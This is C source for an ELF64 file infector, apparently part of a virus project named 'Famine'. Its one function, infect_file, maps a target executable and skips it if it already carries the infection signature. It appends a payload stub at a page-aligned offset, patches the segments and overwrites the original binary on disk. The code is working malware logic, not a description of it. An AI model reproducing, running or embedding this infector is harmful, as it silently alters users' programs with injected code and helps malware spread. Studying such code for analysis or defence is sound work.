#include "../include/famine.h"

int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
{
	t_famine	f;
	struct stat st;
	void		*map;
	int			fd;

	fd = sys_open(path, O_RDONLY, 0);
	if (sys_ret_is_err(fd))
		return (LOG("open(%s) failed\n", path), 1);
	if (sys_ret_is_err(sys_fstat(fd, &st)) || st.st_size < (off_t)sizeof(Elf64_Ehdr))
		return (LOG("fstat/size check failed\n"), sys_close(fd), 1);

	map = (void*)sys_mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	if (map == MAP_FAILED || sys_ret_is_err((size_t)map))
		return (LOG("mmap failed\n"), 1);
	if (!is_valid_elf((Elf64_Ehdr *)map, st.st_size) || my_memmem(map, st.st_size, FAMINE_SIG, sizeof(FAMINE_SIG) - 1))
		return (sys_munmap(map, st.st_size), 1);

	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
	f.out_size = f.stub_offset + stub_len;
	f.out = malloc(f.out_size);
	if (!f.out)
		return (sys_munmap(map, st.st_size), 1);
	my_memset(f.out, 0, f.out_size);
	my_memcpy(f.out, map, st.st_size);
	sys_munmap(map, st.st_size);

	f.ehdr = (Elf64_Ehdr *)f.out;
	f.phdr = (Elf64_Phdr *)(f.out + f.ehdr->e_phoff);
	if (find_segments(&f))
		return (free(f.out), 1);

	inject_stub(&f, stub, stub_len);

	fd = sys_open(path, O_WRONLY | O_TRUNC, st.st_mode & 07777);
	if (sys_ret_is_err(fd))
		return (LOG("open(%s) for write failed\n", path), free(f.out), 1);
	if (sys_write(fd, f.out, f.out_size) != f.out_size)
		return (LOG("write failed\n"), sys_close(fd), free(f.out), 1);
	sys_close(fd);
	free(f.out);
	return (0);
}
